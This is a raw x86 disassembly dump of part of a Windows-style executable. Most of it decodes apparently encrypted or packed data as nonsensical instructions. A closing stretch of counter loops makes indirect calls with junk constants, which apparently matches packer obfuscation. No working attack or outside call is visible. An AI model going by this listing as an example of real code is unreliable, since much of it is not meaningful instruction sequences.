  40992e:	lea    ebp,[ebp-0x54b1c8db]
  409934:	inc    eax
  409935:	sub    BYTE PTR [eax+0x62],0x48
  409939:	stc    
  40993a:	and    DWORD PTR [edx+0x38606355],0xffffffeb
  409941:	fld    DWORD PTR [esi+edx*4+0x45ec48c9]
  409948:	cwde   
  409949:	pop    ds
  40994a:	and    eax,ebp
  40994c:	jg     0x40993f
  40994e:	adc    DWORD PTR [ebp-0x73aff72c],edi
  409954:	ror    BYTE PTR [eax],0x36
  409957:	xchg   esi,eax
  409958:	or     DWORD PTR [bx+di],edx
  40995b:	call   0x30fa9fbb
  409960:	idiv   bh
  409962:	imul   edi,ebp,0x43
  409965:	hlt    
  409966:	movs   DWORD PTR es:[edi],DWORD PTR es:[esi]
  409968:	js     0x40997b
  40996a:	or     BYTE PTR [esi+edx*2],bl
  40996d:	add    al,0xcf
  409970:	mov    dh,0x23
  409972:	repnz inc eax
  409974:	push   ecx
  409975:	stos   DWORD PTR es:[edi],eax
  409976:	sub    al,BYTE PTR [ebx]
  409978:	or     al,0x8f
  40997a:	mov    ds:0x104904f7,eax
  40997f:	and    DWORD PTR [ebx+0x4b],esi
  409982:	mov    al,ah
  409984:	mov    edi,0x1d8840a0
  409989:	jns    0x40994e
  40998b:	aas    
  40998c:	int    0xd6
  40998e:	test   al,0x4
  409990:	icebp  
  409991:	cmp    bl,BYTE PTR [ecx]
  409993:	mov    esi,ecx
  409995:	jl     0x409953
  409997:	add    BYTE PTR [ebx-0x190ddcf7],dl
  40999d:	in     al,dx
  40999e:	push   cs
  40999f:	shl    BYTE PTR [ebx+0x1f],cl
  4099a2:	pushf  
  4099a3:	mov    edi,0x9321153e
  4099a8:	mul    BYTE PTR [esi-0x54]
  4099ab:	fdiv   DWORD PTR [esi+ebp*8-0x59]
  4099af:	dec    esi
  4099b0:	xchg   ecx,eax
  4099b1:	fld    TBYTE PTR [eax+0x24]
  4099b4:	inc    ebx
  4099b5:	out    0x8a,al
  4099b7:	mov    edx,DWORD PTR [esi*4+0x5f946cbd]
  4099be:	fiadd  WORD PTR [ebx-0x7389f3ac]
  4099c4:	xor    BYTE PTR [edx],dl
  4099c6:	shl    bl,1
  4099c8:	dec    edi
  4099c9:	fdivr  DWORD PTR [esi+ecx*1]
  4099cc:	xchg   ecx,eax
  4099cd:	aas    
  4099ce:	jl     0x409957
  4099d0:	pusha  
  4099d1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4099d2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4099d3:	shl    DWORD PTR [edi-0x352cb29d],1
  4099d9:	mov    ah,cl
  4099db:	popa   
  4099dc:	xor    esi,DWORD PTR [eax+0x64]
  4099df:	mov    dh,0x8d
  4099e1:	jne    0x409a32
  4099e3:	xor    eax,0x25f5371
  4099e8:	or     DWORD PTR [ebx-0x51],ebp
  4099eb:	call   0x7a11f8ac
  4099f0:	mov    cl,0x77
  4099f2:	fld    QWORD PTR ds:0x517172a6
  4099f8:	mov    bl,BYTE PTR [edx+eiz*2]
  4099fb:	mov    dh,0xc0
  4099fd:	mov    dh,0x91
  4099ff:	mov    bh,0x9a
  409a01:	pusha  
  409a02:	aam    0x9f
  409a04:	loopne 0x409a2e
  409a06:	mov    dh,0x7b
  409a08:	sar    dl,1
  409a0a:	pop    eax
  409a0b:	aas    
  409a0c:	shl    dh,0x29
  409a0f:	cmp    DWORD PTR [edx+0x5ee618ba],eax
  409a15:	pop    es
  409a16:	mov    eax,0x91c32c3e
  409a1b:	xchg   ebx,eax
  409a1c:	pop    eax
  409a1d:	sub    cl,BYTE PTR [edx+0x351440ce]
  409a23:	mov    ebp,0x1a4749fd
  409a28:	not    ebp
  409a2a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409a2b:	and    DWORD PTR [eax],ebx
  409a2d:	jp     0x409a05
  409a2f:	pusha  
  409a30:	lock pop edx
  409a32:	dec    BYTE PTR [ebp+0x3df2f9f5]
  409a38:	add    ebx,DWORD PTR [edx]
  409a3a:	push   ds
  409a3b:	xchg   edi,eax
  409a3c:	stos   BYTE PTR es:[edi],al
  409a3d:	sub    BYTE PTR [ecx-0x64476c13],dl
  409a43:	mov    eax,cs
  409a45:	add    eax,0x2a4ca29d
  409a4a:	pop    ds
  409a4b:	arpl   WORD PTR [esi+0x34],sp
  409a4e:	icebp  
  409a4f:	(bad)  
  409a50:	std    
  409a51:	enter  0xd1b4,0x3a
  409a55:	pop    ds
  409a56:	fidivr DWORD PTR [eax*8+0x150c2e15]
  409a5d:	js     0x409aa1
  409a5f:	lods   al,BYTE PTR ds:[esi]
  409a60:	lods   al,BYTE PTR ds:[esi]
  409a61:	in     al,dx
  409a62:	push   edx
  409a63:	fdiv   QWORD PTR [eax]
  409a65:	out    dx,al
  409a66:	pop    ebp
  409a67:	pop    edi
  409a69:	push   ebx
  409a6a:	mov    cl,0x8d
  409a6c:	xsha1  (bad)
  409a6d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409a6e:	retf   0xaa7a
  409a71:	xchg   edi,eax
  409a72:	mov    edi,0x683152a
  409a77:	adc    al,0xb6
  409a79:	out    0xd1,al
  409a7b:	outs   dx,BYTE PTR ds:[esi]
  409a7c:	cmp    BYTE PTR [ecx-0xbd156a9],ch
  409a82:	lea    eax,[ebx+0x2adc4d8a]
  409a88:	(bad)
  409a8d:	pushf  
  409a8e:	icebp  
  409a8f:	outs   dx,BYTE PTR ds:[esi]
  409a90:	das    
  409a91:	cld    
  409a92:	cmp    ah,BYTE PTR [ecx]
  409a94:	push   cs
  409a95:	cmp    ecx,DWORD PTR ds:0xa93191ab
  409a9b:	retf   0x8624
  409a9e:	push   ebx
  409a9f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409aa0:	in     eax,dx
  409aa1:	retf   0x1e70
  409aa4:	sbb    eax,0xe83ff6ed
  409aa9:	arpl   WORD PTR [edx+0x1f62b24b],cx
  409aaf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409ab0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409ab1:	retf   
  409ab2:	int3   
  409ab3:	icebp  
  409ab4:	scas   al,BYTE PTR es:[edi]
  409ab5:	fcom   QWORD PTR [ecx+eax*4-0x68]
  409ab9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409aba:	ror    edx,1
  409abc:	je     0x409a46
  409abe:	(bad)  
  409abf:	in     al,dx
  409ac0:	fcomp  QWORD PTR [esp+eax*1+0x2]
  409ac4:	xchg   esp,eax
  409ac5:	test   DWORD PTR [ebp+0x65e81ef0],esi
  409acb:	icebp  
  409acc:	mov    BYTE PTR [edx-0x58],0xcf
  409ad0:	(bad)  
  409ad1:	ds and al,0xa7
  409ad4:	push   edi
  409ad5:	push   cs
  409ad6:	and    ebx,DWORD PTR [ebx+ebp*2]
  409ad9:	mul    cl
  409adb:	(bad)  
  409add:	(bad)  
  409adf:	xchg   ebp,eax
  409ae0:	mov    ds,WORD PTR [edi+0x6afa3cf5]
  409ae6:	sub    al,0xe5
  409ae8:	gs into 
  409aea:	xchg   ebx,eax
  409aeb:	cwde   
  409aec:	pmaxub mm6,QWORD PTR [ebx+eiz*8]
  409af0:	test   al,0x24
  409af2:	fstp   QWORD PTR [eax-0x10]
  409af5:	mov    eax,ds:0xf52c65dd
  409afa:	inc    ebx
  409afb:	iret   
  409afc:	iret   
  409afd:	test   BYTE PTR [ecx-0x7d633497],cl
  409b03:	sub    al,BYTE PTR [esi-0x2d]
  409b06:	mov    ecx,ecx
  409b08:	sar    DWORD PTR [ebx+0x66401ee7],0xf4
  409b0f:	daa    
  409b10:	jle    0x409aec
  409b12:	dec    ebp
  409b13:	cs cmp al,0xdf
  409b16:	push   edx
  409b17:	int3   
  409b18:	cmp    al,0x39
  409b1a:	lahf   
  409b1b:	xor    eax,0x28c558cd
  409b20:	lock mov esp,0x858ad706
  409b26:	hlt    
  409b27:	retf   0x76f3
  409b2a:	mov    cl,0xd7
  409b2c:	(bad)  
  409b2d:	xchg   edx,eax
  409b2e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409b2f:	adc    BYTE PTR [ecx+0x21],0x50
  409b33:	dec    ecx
  409b34:	dec    eax
  409b35:	call   0x6588:0xf7f0c960
  409b3c:	lods   eax,DWORD PTR ds:[esi]
  409b3d:	data16 add ch,al
  409b40:	lods   eax,DWORD PTR ds:[esi]
  409b41:	push   edx
  409b42:	sbb    eax,0x188bee4f
  409b47:	shl    eax,1
  409b49:	outs   dx,DWORD PTR ds:[esi]
  409b4a:	mov    eax,0x6ad4be1b
  409b4f:	pop    ecx
  409b50:	and    cl,BYTE PTR [esi+edi*4+0x3cc40039]
  409b57:	leave  
  409b58:	sub    ch,BYTE PTR [eax]
  409b5a:	adc    bx,WORD PTR [edx]
  409b5d:	sbb    eax,0x194d6c3e
  409b62:	dec    edx
  409b63:	add    eax,0x7fcf6b9a
  409b68:	imul   ebp,ebp,0x5a0e1751
  409b6e:	xor    al,0xa3
  409b70:	cmc    
  409b71:	nop
  409b72:	jecxz  0x409b8d
  409b74:	push   esp
  409b75:	dec    eax
  409b76:	div    DWORD PTR [eax-0x45]
  409b79:	(bad)  
  409b7a:	adc    esp,DWORD PTR [eax]
  409b7c:	push   ss
  409b7d:	in     al,dx
  409b7e:	mov    dl,0xaf
  409b80:	xchg   DWORD PTR [ecx+0x77738ce],ebx
  409b86:	push   cs
  409b87:	pop    esp
  409b88:	dec    edi
  409b89:	iret   
  409b8a:	cdq    
  409b8b:	xchg   edx,eax
  409b8c:	sbb    eax,0x30eec6a9
  409b91:	fist   DWORD PTR [ecx-0x2542e03]
  409b97:	lods   eax,DWORD PTR ds:[esi]
  409b98:	mov    ds:0xd0f8789e,al
  409b9d:	mov    ebx,?
  409b9f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409ba0:	xor    cl,BYTE PTR [ebp+0x5b]
  409ba3:	mov    al,0x51
  409ba5:	out    0x8e,al
  409ba7:	push   ds
  409ba8:	ja     0x409b5d
  409baa:	pop    esp
  409bab:	and    ah,BYTE PTR [eax]
  409bad:	inc    esi
  409bae:	mov    ds:0xc78d3b2c,al
  409bb3:	adc    DWORD PTR [edi+0xe],ebp
  409bb6:	ss or  al,0xaa
  409bb9:	adc    eax,0xbcca7840
  409bbe:	sbb    DWORD PTR [ecx],ecx
  409bc0:	out    0x3e,eax
  409bc2:	or     eax,DWORD PTR [eax-0x712b833]
  409bc8:	push   edi
  409bc9:	fwait
  409bca:	(bad)  
  409bcb:	pop    ebx
  409bcc:	push   esp
  409bcd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409bce:	push   DWORD PTR [eax+0x81a060a]
  409bd4:	or     eax,DWORD PTR [esi]
  409bd6:	cmp    al,0xc3
  409bd8:	fist   DWORD PTR fs:[eax]
  409bdb:	imul   edx,DWORD PTR [esi-0x410434ef],0x1540e543
  409be5:	xor    BYTE PTR [eax-0x4b82b0a1],dl
  409beb:	sbb    edi,esi
  409bed:	and    al,0x1c
  409bef:	aam    0x82
  409bf1:	lds    ebx,FWORD PTR [ebx+0x71]
  409bf4:	in     eax,0x8e
  409bf6:	xchg   esp,eax
  409bf7:	xlat   BYTE PTR ds:[ebx]
  409bf8:	xchg   esp,eax
  409bf9:	ins    DWORD PTR es:[edi],dx
  409bfa:	inc    esp
  409bfb:	mov    al,ds:0xd60015d0
  409c00:	adc    eax,0x9bd19410
  409c05:	mov    bh,0x12
  409c07:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409c08:	push   esi
  409c09:	add    al,BYTE PTR [ebp-0x6f]
  409c0c:	lahf   
  409c0d:	jp     0x409c28
  409c0f:	cdq    
  409c10:	jl     0x409c6c
  409c12:	aam    0xd5
  409c14:	adc    edx,edx
  409c16:	js     0x409c41
  409c18:	add    eax,0x35f184db
  409c1d:	inc    ebx
  409c1e:	sbb    BYTE PTR [edx+0x4d],dh
  409c21:	out    dx,al
  409c22:	xor    BYTE PTR [eax+0x69],ah
  409c25:	adc    dh,dh
  409c27:	adc    al,0xd7
  409c29:	imul   eax,esp,0x594adcb8
  409c2f:	je     0x409c30
  409c31:	dec    edx
  409c32:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409c33:	pop    ebx
  409c34:	ret    
  409c35:	in     eax,dx
  409c36:	jb     0x409c8a
  409c38:	jmp    0xdd46:0xfba337e9
  409c3f:	pop    es
  409c40:	mov    WORD PTR [edx+0x48],ds
  409c43:	fwait
  409c44:	test   al,0x0
  409c46:	xor    BYTE PTR [esi],bh
  409c48:	std    
  409c49:	fistp  DWORD PTR [ebx-0x47]
  409c4c:	ja     0x409be7
  409c4e:	pop    esi
  409c4f:	ja     0x409cad
  409c51:	pop    es
  409c52:	js     0x409bf5
  409c54:	xor    BYTE PTR [ebp+0x14b31273],0x52
  409c5b:	sub    eax,DWORD PTR [eax+edx*2]
  409c5e:	cwde   
  409c5f:	sar    BYTE PTR [edx+edi*1+0x399d368e],1
  409c66:	sbb    dl,al
  409c68:	xor    al,0x63
  409c6a:	xchg   ebx,eax
  409c6b:	push   edi
  409c6c:	sub    ebx,DWORD PTR [ebp+0x2371ba4e]
  409c72:	out    0x9f,eax
  409c74:	jne    0x409cba
  409c76:	dec    ecx
  409c77:	cli    
  409c78:	dec    edx
  409c79:	xchg   ecx,eax
  409c7a:	imul   edx,edi,0x47f5ca14
  409c80:	jne    0x409cb6
  409c82:	btr    ecx,esi
  409c85:	push   0xffffffc9
  409c87:	pop    ecx
  409c88:	jp     0x409c8f
  409c8a:	mov    dl,0x51
  409c8c:	sbb    al,0x21
  409c8e:	aam    0x1c
  409c90:	cdq    
  409c91:	adc    BYTE PTR [eax-0x21],bh
  409c94:	clc    
  409c95:	mov    esp,0xae26c114
  409c9a:	gs dec esi
  409c9c:	inc    edi
  409c9d:	nop
  409c9e:	mov    ebp,0x522ba84b
  409ca3:	push   es
  409ca4:	ret    0x5fb2
  409ca7:	xor    al,0x1d
  409ca9:	rcr    DWORD PTR [edi-0x61],0x2a
  409cad:	sar    DWORD PTR [eax+0xfc3316b],0x76
  409cb4:	stc    
  409cb5:	stc    
  409cb6:	js     0x409c84
  409cb8:	cwde   
  409cb9:	ret    
  409cba:	lods   al,BYTE PTR ds:[esi]
  409cbb:	jle    0x409d0f
  409cbd:	push   0x7d8dc0d7
  409cc2:	push   0x63
  409cc4:	xchg   ebx,eax
  409cc5:	daa    
  409cc6:	leave  
  409cc7:	push   esi
  409cc8:	fwait
  409cc9:	mov    bh,0x97
  409ccb:	lds    ebp,FWORD PTR [bx-0x6e]
  409ccf:	or     BYTE PTR [eax-0x2856d82c],cl
  409cd5:	jmp    0x93a8:0x5a60a3a
  409cdc:	loopne 0x409cf6
  409cde:	cli    
  409cdf:	and    al,0x4d
  409ce1:	sub    al,ah
  409ce3:	call   DWORD PTR [ebp-0x42]
  409ce6:	xor    dh,BYTE PTR [ebp+esi*2+0x70]
  409cea:	mov    ecx,0xb2a7b139
  409cef:	arpl   WORD PTR [ebp+0x28a16eb1],cx
  409cf5:	pop    ds
  409cf6:	pop    ds
  409cf7:	xchg   DWORD PTR [ebx-0x666951e4],esp
  409cfd:	sahf   
  409cfe:	mov    ebp,ebp
  409d00:	inc    eax
  409d01:	outs   dx,DWORD PTR ds:[esi]
  409d02:	inc    edx
  409d03:	dec    ebx
  409d04:	je     0x409d01
  409d06:	push   esi
  409d07:	(bad)  
  409d09:	gs dec ebp
  409d0b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409d0c:	es pushf 
  409d0e:	mov    BYTE PTR [esi],ch
  409d10:	cmp    al,0x22
  409d12:	aas    
  409d13:	mov    esi,0x4d96db56
  409d18:	dec    esp
  409d19:	ret    
  409d1a:	cwde   
  409d1b:	jo     0x409d7c
  409d1d:	nop
  409d1e:	adc    DWORD PTR ds:0x168740a6,esp
  409d24:	pop    edi
  409d25:	inc    ecx
  409d26:	adc    ch,dl
  409d28:	out    dx,al
  409d29:	mov    WORD PTR [esi-0x2],?
  409d2c:	push   ds
  409d2d:	dec    ebx
  409d2e:	das    
  409d2f:	jns    0x409d43
  409d31:	jl     0x409d51
  409d33:	mov    edi,0x93a144d8
  409d38:	xchg   esp,eax
  409d39:	mov    ebp,0x2b6ca476
  409d3e:	xchg   ebx,eax
  409d3f:	repnz fcomp st(1)
  409d42:	cs es cmp eax,0xebfa00f
  409d49:	cmp    al,0x9e
  409d4b:	cmp    BYTE PTR [eax-0x7a],ah
  409d4e:	mov    ebx,0xa86e2a8c
  409d53:	ins    BYTE PTR es:[edi],dx
  409d54:	mov    ds:0xf31683e2,eax
  409d59:	push   ebx
  409d5a:	or     eax,0xfefbb47e
  409d5f:	pop    edi
  409d60:	test   BYTE PTR [eax-0xe26c9af],0x92
  409d67:	xchg   esi,eax
  409d68:	adc    eax,0x5e8ab1ac
  409d6d:	das    
  409d6e:	das    
  409d6f:	cmc    
  409d70:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409d71:	into   
  409d72:	or     al,0x4a
  409d74:	and    BYTE PTR [ebx],bh
  409d76:	jo     0x409d61
  409d78:	mov    ecx,0x89f4c02
  409d7d:	mov    bh,BYTE PTR [ecx+0x16bb48fd]
  409d83:	jmp    0xd08:0x4952c2b1
  409d8a:	outs   dx,DWORD PTR ds:[esi]
  409d8b:	jb     0x409dec
  409d8d:	js     0x409dac
  409d8f:	push   esp
  409d90:	mov    ebx,0x204737a
  409d95:	sbb    BYTE PTR [ebx-0x5d],bl
  409d98:	push   ecx
  409d99:	sbb    dl,bh
  409d9b:	(bad)  
  409d9c:	or     DWORD PTR [eax],edx
  409d9e:	into   
  409d9f:	or     BYTE PTR [edx+ebx*1-0x34],dl
  409da3:	dec    eax
  409da4:	pop    ebx
  409da5:	inc    esp
  409da6:	jmp    0x289a5411
  409dab:	es popf 
  409dad:	inc    edx
  409dae:	sti    
  409daf:	adc    al,0xb2
  409db1:	out    dx,eax
  409db2:	xlat   BYTE PTR ds:[ebx]
  409db3:	xor    al,0xe1
  409db5:	mov    eax,ds:0x3e73ea00
  409dbb:	cmp    BYTE PTR [ebp+0x5d],0x6c
  409dbf:	out    0xf5,eax
  409dc1:	adc    eax,0xa7e0188c
  409dc6:	jne    0x409dd5
  409dc8:	fisttp DWORD PTR [esi]
  409dca:	jge    0x409dd9
  409dcc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409dcd:	icebp  
  409dce:	mov    cl,BYTE PTR [edi]
  409dd0:	iret   
  409dd1:	mov    ebx,0x2c11ce6f
  409dd6:	pop    esi
  409dd7:	dec    edx
  409dd8:	sub    al,0x59
  409dda:	cmp    BYTE PTR [eax+0x22],cl
  409ddd:	loop   0x409e2f
  409ddf:	loop   0x409d76
  409de1:	cwde   
  409de2:	jo     0x409d9b
  409de4:	fdiv   st,st(7)
  409de6:	test   eax,0x2d39f2fb
  409deb:	loop   0x409e4c
  409ded:	sub    BYTE PTR [ebp-0x1e],dh
  409df0:	cmp    al,0x22
  409df2:	jbe    0x409e20
  409df4:	clc    
  409df5:	loop   0x409db9
  409df7:	loope  0x409e2b
  409df9:	jmp    0xcde7:0xb848b520
  409e00:	jbe    0x409e6e
  409e02:	into   
  409e03:	mul    DWORD PTR [ebx-0x5cd20b8b]
  409e09:	jl     0x409e07
  409e0b:	lods   eax,DWORD PTR ds:[esi]
  409e0c:	aas    
  409e0d:	cli    
  409e0e:	call   0x3f7ff96b
  409e13:	repz pushf 
  409e15:	xchg   ebx,eax
  409e16:	(bad)  
  409e17:	fs add al,0x3
  409e1a:	fcomp  DWORD PTR [ebx]
  409e1c:	xchg   ebp,eax
  409e1d:	loop   0x409e24
  409e1f:	hlt    
  409e20:	daa    
  409e21:	xor    ch,ah
  409e23:	and    edx,esp
  409e25:	mov    ch,0x51
  409e27:	jl     0x409e00
  409e29:	adc    esp,DWORD PTR [ebx+0x63]
  409e2c:	sub    eax,0xab34122b
  409e31:	das    
  409e32:	xor    BYTE PTR [edi+0x7b],0xac
  409e36:	push   eax
  409e37:	or     dh,BYTE PTR [edi]
  409e39:	sbb    eax,0xc54060af
  409e3e:	outs   dx,BYTE PTR ds:[esi]
  409e3f:	sbb    esi,esi
  409e41:	(bad)  
  409e42:	loop   0x409e44
  409e44:	jbe    0x409dd3
  409e46:	push   edx
  409e47:	popa   
  409e48:	dec    esi
  409e49:	in     al,0x1e
  409e4b:	sbb    eax,0x853265e3
  409e50:	sahf   
  409e51:	or     eax,0xc757d5dc
  409e56:	mov    ds:0x99a98cd2,al
  409e5b:	push   edx
  409e5c:	inc    ebp
  409e5d:	sub    al,al
  409e5f:	retf   0xfd9a
  409e62:	inc    ebx
  409e63:	inc    ecx
  409e64:	and    al,0x93
  409e66:	dec    ecx
  409e67:	sbb    DWORD PTR [esi+0x4d45c128],eax
  409e6d:	inc    ebp
  409e6e:	loope  0x409e80
  409e70:	cs (bad) 
  409e72:	mov    dl,0x57
  409e74:	in     eax,0x70
  409e76:	frstor [esi+0x6b]
  409e79:	xchg   ebp,eax
  409e7a:	rcr    BYTE PTR [ecx-0x75],cl
  409e7d:	das    
  409e7e:	push   ecx
  409e7f:	add    al,0x49
  409e81:	pop    ecx
  409e82:	test   al,0xa3
  409e84:	(bad)  
  409e85:	sbb    dh,bh
  409e87:	add    bl,dh
  409e89:	sub    DWORD PTR [edx+0x4aad075b],esp
  409e8f:	sahf   
  409e90:	or     DWORD PTR [ecx],ebx
  409e92:	xor    dl,bl
  409e94:	stc    
  409e95:	sbb    esi,eax
  409e97:	push   edi
  409e98:	cdq    
  409e99:	jp     0x409e9c
  409e9b:	in     eax,0xbe
  409e9d:	out    dx,al
  409e9e:	xor    BYTE PTR [ebp+ebp*1-0x2baf8aa7],al
  409ea5:	rcl    DWORD PTR [ecx+0x55],1
  409ea8:	cmp    ecx,DWORD PTR [ecx+0x11ed46f2]
  409eae:	xchg   edx,eax
  409eaf:	ds je  0x409e41
  409eb2:	sti    
  409eb3:	mov    bh,bh
  409eb5:	jle    0x409ee9
  409eb7:	dec    edi
  409eb8:	and    ebx,esi
  409eba:	imul   BYTE PTR [ecx+0x72a1e7b6]
  409ec0:	jge    0x409eee
  409ec2:	sbb    eax,0x56666421
  409ec7:	sbb    eax,0x19dbb77a
  409ecc:	sub    DWORD PTR [ebp-0xdd24331],edi
  409ed2:	jne    0x409f43
  409ed4:	pop    ecx
  409ed5:	lods   al,BYTE PTR ds:[esi]
  409ed6:	and    ebp,DWORD PTR [edx+0x6]
  409ed9:	rcl    DWORD PTR [ebx+0x5a],1
  409edc:	push   edx
  409edd:	xchg   edi,eax
  409ede:	mov    ch,0xb
  409ee0:	ins    BYTE PTR es:[edi],dx
  409ee1:	sbb    al,0x52
  409ee3:	outs   dx,DWORD PTR ds:[esi]
  409ee4:	mov    edx,0xbe947a46
  409ee9:	ficom  WORD PTR [edi]
  409eeb:	add    dl,bl
  409eed:	sbb    edi,DWORD PTR [edx]
  409eef:	sbb    esp,DWORD PTR [edi+ebp*1-0xa]
  409ef3:	cdq    
  409ef4:	fwait
  409ef5:	adc    esi,0xffffffe9
  409ef8:	not    ebx
  409efa:	sub    edi,eax
  409efc:	jp     0x409f5a
  409efe:	push   ebp
  409eff:	jae    0x409f7d
  409f01:	in     eax,0x83
  409f03:	xor    esi,DWORD PTR [ecx+edx*2-0x2dd03d3]
  409f0a:	sub    esp,DWORD PTR [ebp+0x61961654]
  409f10:	jno    0x409f79
  409f12:	or     bl,cl
  409f14:	test   BYTE PTR [ebx],cl
  409f16:	sub    DWORD PTR [ecx+0x10cd797c],ecx
  409f1c:	adc    dl,BYTE PTR [eax+0x24]
  409f1f:	add    al,0x74
  409f21:	and    al,0x17
  409f23:	push   esi
  409f24:	stc    
  409f25:	jo     0x409f34
  409f27:	mov    al,ds:0x29a1c939
  409f2c:	fsub   st(3),st
  409f2e:	pusha  
  409f2f:	icebp  
  409f30:	(bad)  
  409f31:	xchg   esp,eax
  409f32:	sbb    DWORD PTR [ecx-0x5c],esp
  409f35:	cmp    esi,DWORD PTR [ecx+0x11]
  409f38:	out    dx,eax
  409f39:	nop
  409f3a:	adc    DWORD PTR [eax+eiz*4],edi
  409f3d:	mov    ah,BYTE PTR [esi]
  409f3f:	fs gs fwait
  409f42:	aas    
  409f43:	mov    ecx,0x1c9db6d7
  409f48:	fs out dx,eax
  409f4a:	sub    al,BYTE PTR [edi-0x433a191d]
  409f50:	mov    edi,0x75962d5f
  409f55:	jb     0x409eda
  409f57:	add    dl,BYTE PTR [edx]
  409f59:	push   ecx
  409f5a:	pop    edx
  409f5b:	pusha  
  409f5c:	repnz seto BYTE PTR ds:0xb1751c8c
  409f64:	pop    ds
  409f65:	add    edx,edi
  409f67:	fidiv  WORD PTR [ebp+0x4eccde49]
  409f6d:	mov    ebp,0x63dc1a03
  409f72:	and    BYTE PTR [ecx+0x3a352723],0xe3
  409f79:	mov    ds:0xb61a260,al
  409f7e:	ret    0xe34b
  409f81:	mov    eax,DWORD PTR [eax+0x198]
  409f87:	and    DWORD PTR ds:0x429008,0x0
  409f91:	xor    edx,edx
  409f93:	add    edx,DWORD PTR ds:0x429008
  409f99:	inc    edx
  409f9a:	mov    DWORD PTR ds:0x429008,edx
  409fa0:	cmp    DWORD PTR ds:0x429008,0x11
  409fa7:	jne    0x409fe0
  409fad:	push   DWORD PTR [ebp-0x28]
  409fb0:	push   DWORD PTR [ebp-0xc]
  409fb3:	push   0x130f
  409fb8:	push   0x751a
  409fbd:	push   0x8a1e
  409fc2:	push   0x2320
  409fc7:	push   DWORD PTR [ebp-0x24]
  409fca:	push   0x206d
  409fcf:	push   DWORD PTR [ebp-0xc]
  409fd2:	push   DWORD PTR [ebp-0x20]
  409fd5:	push   0x5142
  409fda:	call   DWORD PTR ds:0x42e8db
  409fe0:	cmp    DWORD PTR ds:0x429008,0x10
  409fe7:	jne    0x409ffa
  409fed:	mov    edx,DWORD PTR ds:0x429008
  409ff3:	inc    edx
  409ff4:	mov    DWORD PTR ds:0x429008,edx
  409ffa:	cmp    DWORD PTR ds:0x429008,0x1e
  40a001:	jb     0x409f91
  40a007:	xor    edi,ecx
  40a009:	add    DWORD PTR ds:0x42d000,ebx
  40a00f:	mov    edx,0x3272e2
  40a014:	mov    DWORD PTR ds:0x42c010,0x65c3
  40a01e:	add    edi,edx
  40a020:	cmp    DWORD PTR [eax],edi
  40a022:	mov    DWORD PTR ds:0x42a00c,0xde
  40a02c:	je     0x40a043
  40a032:	mov    eax,DWORD PTR [eax]
  40a034:	mov    DWORD PTR ds:0x42c004,0x3704
  40a03e:	jmp    0x40ea3f
  40a043:	mov    eax,ds:0x42b010
  40a048:	mov    eax,DWORD PTR [ebp+0x18]
  40a04b:	cmp    eax,esi
  40a04d:	mov    DWORD PTR ds:0x42a00c,0x4db6
  40a057:	jne    0x40a071
  40a05d:	mov    DWORD PTR ds:0x42c008,0x3d03
  40a067:	push   0xf89c8584
  40a06c:	jmp    0x40ea2e
  40a071:	mov    esi,DWORD PTR [ebp+0x18]
  40a074:	mov    eax,0xf89c85bb
  40a079:	cmp    esi,eax
  40a07b:	mov    DWORD PTR ds:0x42b008,0x1a7e
  40a085:	jne    0x40ea1e
  40a08b:	sbb    eax,esi
  40a08d:	mov    eax,DWORD PTR [ebp+0x10]
  40a090:	and    DWORD PTR ds:0x42c010,0x0
  40a09a:	mov    esi,DWORD PTR ds:0x42c010
  40a0a0:	inc    esi
  40a0a1:	mov    DWORD PTR ds:0x42c010,esi
  40a0a7:	cmp    DWORD PTR ds:0x42c010,0x1f
  40a0ae:	jne    0x40a0cf
  40a0b4:	push   0x2683
  40a0b9:	push   DWORD PTR [ebp-0x20]
  40a0bc:	push   0x3e9b
  40a0c1:	push   DWORD PTR [ebp-0x20]
  40a0c4:	push   0x63df
  40a0c9:	call   DWORD PTR ds:0x42e8df
  40a0cf:	cmp    DWORD PTR ds:0x42c010,0x13
  40a0d6:	jb     0x40a09a
  40a0dc:	mov    DWORD PTR ds:0x42c008,0x14
  40a0e6:	cmp    DWORD PTR ds:0x42c008,0x0
  40a0ed:	je     0x40a126
  40a0f3:	cmp    DWORD PTR ds:0x42c008,0x1c
  40a0fa:	jne    0x40a106
  40a100:	call   DWORD PTR ds:0x42e91b
  40a106:	xor    esi,esi
  40a108:	xor    esi,DWORD PTR ds:0x42c008
  40a10e:	dec    esi
  40a10f:	mov    DWORD PTR ds:0x42c008,esi
  40a115:	jmp    0x40a0e6
  40a11a:	mov    esi,DWORD PTR ds:0x42901c
  40a120:	or     DWORD PTR ds:0x429020,esi
  40a126:	xor    eax,ecx
  40a128:	and    esi,DWORD PTR ds:0x42c018
  40a12e:	add    eax,edx
  40a130:	and    DWORD PTR ds:0x42c004,0x0
  40a13a:	xor    esi,esi
  40a13c:	add    esi,DWORD PTR ds:0x42c004
  40a142:	inc    esi
  40a143:	mov    DWORD PTR ds:0x42c004,esi
  40a149:	cmp    DWORD PTR ds:0x42c004,0xd
  40a150:	jne    0x40a164
  40a156:	push   0x6b46
  40a15b:	push   DWORD PTR [ebp-0x10]
  40a15e:	call   DWORD PTR ds:0x42e91f
  40a164:	cmp    DWORD PTR ds:0x42c004,0xc
  40a16b:	jne    0x40a180
  40a171:	xor    esi,esi
  40a173:	xor    esi,DWORD PTR ds:0x42c004
  40a179:	inc    esi
  40a17a:	mov    DWORD PTR ds:0x42c004,esi
  40a180:	cmp    DWORD PTR ds:0x42c004,0x1b
  40a187:	jb     0x40a13a
  40a18d:	xor    esi,esi
  40a18f:	xor    esi,DWORD PTR ds:0x42c010
